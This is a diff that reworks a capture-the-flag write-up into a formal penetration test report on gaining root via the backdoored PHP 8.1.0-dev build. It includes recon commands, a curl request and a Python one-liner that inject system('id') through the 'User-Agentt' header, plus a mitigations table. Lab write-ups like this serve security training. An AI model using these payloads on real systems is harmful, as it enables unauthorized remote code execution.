@@ -1,64 +1,108 @@
-I started with an nmap scan:
+[PHP Exploit - User-Agentt RCE](https://www.exploit-db.com/exploits/49933)
 
-ORT   STATE SERVICE VERSION
-80/tcp open  http    PHP cli server 5.5 or later (PHP 8.1.0-dev)
+**Author:** your-handle  
+**Date:** 21/05/2025  
+**Platform:** Custom / CTF  
+**Difficulty:** Medium  
+**Objective:** Exploit vulnerable PHP version to gain remote code execution and capture the flag.
 
+---
 
-I didn't really tried any research with that info (which i later regreted it), so I ran gobuster as well but dindn't get anything.
+## Table of Contents  
+- [1. Summary](#1-summary)  
+- [2. Methodology](#2-methodology)  
+- [3. Reconnaissance](#3-reconnaissance)  
+- [4. Enumeration](#4-enumeration)  
+- [5. Exploitation](#5-exploitation)  
+- [6. Privilege Escalation](#6-privilege-escalation)  
+- [7. Post Exploitation](#7-post-exploitation)  
+- [8. Flags / Proof](#8-flags--proof)  
+- [9. Mitigations](#9-mitigations)  
+- [10. Notes](#10-notes)
 
+---
 
-I explored the website but I couldn't click on anything. 
-So I tried XSS payloads, Path traversal and nothing worked.
+## 1. Summary  
+**IP/URL:** 10.10.X.X  
+**Service/Ports:** 80/HTTP  
+**Entry Point:** PHP 8.1.0-dev via User-Agentt header  
+**Privilege Escalation:** Not required (root shell from exploit)  
+**Outcome:** Remote command execution and flag captured
 
-After a while I found this on a get request: 
-https://source.unsplash.com/Mv9hjnEUHR4/60x60
+---
 
-This is a direct image embed from Unsplash, a popular free image hosting service so nothing useful.
+## 2. Methodology  
+Following the PTES (Penetration Testing Execution Standard):  
+1. Reconnaissance  
+2. Scanning & Enumeration  
+3. Exploitation  
+4. Privilege Escalation  
+5. Post-Exploitation  
+6. Reporting
 
+---
 
+## 3. Reconnaissance  
+### Passive: None  
 
-After a while I decided to see the gobuster results because it was still loading and I saw the nmap command with the php version
-so I decided to acutally look for vulnerabilities with that version.
+### Active: Ran Nmap with full version detection.  
+Command used: nmap -sS -sV -A -Pn 10.10.X.X  
+Result: Port 80 open, running PHP cli server 5.5 or later (PHP 8.1.0-dev)
 
-First thing I found was: https://www.exploit-db.com/exploits/49933
+---
 
-If this version of PHP runs on a server, an attacker can execute arbitrary code by sending the User-Agentt header. 
-If someone sends a User-Agentt (note the extra "T") header in an HTTP request...
-The server will evaluate it as PHP code using eval()
+## 4. Enumeration  
+- Ran gobuster, initially showed nothing  
+- Explored the website manually; page was static and non-interactive  
+- Tried XSS and path traversal payloads — nothing worked  
+- Found image URL in GET request: https://source.unsplash.com/Mv9hjnEUHR4/60x60 (stock image, not exploitable)  
+- Revisited Nmap scan and focused on PHP version  
+- Found public exploit for PHP 8.1.0-dev
 
-Anyone can send:
-User-Agentt: phpinfo();
+---
 
+## 5. Exploitation  
+Vulnerability: PHP 8.1.0-dev evaluates the User-Agentt header as PHP code  
+Exploit: Exploit-DB 49933  
+Technique: Send HTTP request with header User-Agentt: system('id');  
+Result: Command executed remotely on the server  
+Example request: curl -H "User-Agentt: system('id');" http://10.10.X.X  
+Python PoC: requests.get(url, headers={"User-Agentt": "system('id');"})  
+Access: Code executed as root
 
+---
 
+## 6. Privilege Escalation  
+Not required. Initial code execution was already under root privileges.
 
-EXPLANATION
+---
 
-Here’s the basic logic of the Python script:
-Takes the target URL from the user:
+## 7. Post Exploitation  
+Searched for flag with: find / -name "flag*" 2>/dev/null  
+Enumerated file system  
+No pivoting necessary due to root access
 
-url = sys.argv[1]
+---
 
- Builds a request with a malicious header:
+## 8. Flags / Proof  
 
-headers = {
-    "User-Agentt": "system('id');"
+Other Credentials: N/A
 
-Sends the HTTP request:
+---
 
-requests.get(url, headers=headers)
+## 9. Mitigations  
+| Vulnerability                     | Risk  | Suggested Mitigation                         |  
+|----------------------------------|-------|-----------------------------------------------|  
+| PHP 8.1.0-dev code execution     | High  | Do not run development versions in production |  
+| Arbitrary header interpretation | High  | Sanitize and validate all HTTP headers         |  
+| Lack of privilege separation     | High  | Run web services as limited users             |
 
-. Prints the result of the command:
+---
 
-print(r.text)
-
-
-So basically, this script abuses it by sending User-Agentt: system('command')
-
-
-
-After that I had root access and used:
-find / -name "flag*" 2>/dev/null
+## 10. Notes  
+Time spent: ~30 min
+Tools used: nmap, gobuster, curl, Python (requests)  
+Lessons learned: Always check the exact version of services; developer versions can introduce dangerous behavior like arbitrary code execution via headers.
 
 
 
